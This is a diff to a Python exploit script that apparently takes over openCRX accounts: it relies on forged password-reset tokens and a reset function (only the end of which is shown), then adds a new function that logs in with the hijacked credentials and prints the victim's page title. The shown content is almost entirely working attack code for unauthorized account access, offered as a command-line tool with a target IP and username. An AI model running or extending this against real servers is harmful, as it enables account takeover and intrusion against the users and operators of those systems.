@@ -52,11 +52,32 @@ def resetPassword(ip, tokens, user, passwd):
 				print("\n[+] Credential "+passwd+" succesfully applied for user "+user)
 				break
 
+def authenticate(ip, user, passwd):
+	target = "http://%s" % ip
+	data = { "j_username": user,
+	 		 "j_password": passwd }
+	s.get(target + '/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false')
+	print("\n[+] Attempting to authenticate with the applied credentials...")
+	req = s.post(target + '/opencrx-core-CRX/j_security_check', data=data)
+	res = req.text
+	if "?requestId=" in res:
+		print("\n[+] Login successful!")
+		match = re.search(r"href='(.*?)';", res)
+		if match:
+			url = match.group(1)
+			req = s.get(url)
+			res = req.text
+			user = re.search(r"<title>(.*?)</title>", res)
+			if user:
+				print(user.group(1))
+	else:
+		print("\n[!] Login failed.")
+
 def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--ip', help='Target IP address', required=True)
 	parser.add_argument('--user', help='Target username', required=True)
-	parser.add_argument('--password', help='Desired password to be defined', required=True)
+	parser.add_argument('--passwd', help='Desired password to be defined', required=True)
 	args = parser.parse_args()
 	if len(sys.argv)<=1:
 		print("[!] Usage: python3 %s --ip 192.168.0.5 --user USER --pass NewPass@123" % sys.argv[0])
@@ -64,10 +85,11 @@ def main():
 		sys.exit(-1)
 	ip = args.ip
 	user = args.user
-	passwd = args.password
+	passwd = args.passwd
 
 	tokens = generateToken(ip, user)
 	resetPassword(ip, tokens, user, passwd)
+	authenticate(ip, user, passwd)
 
 if __name__ == "__main__":
 	main()
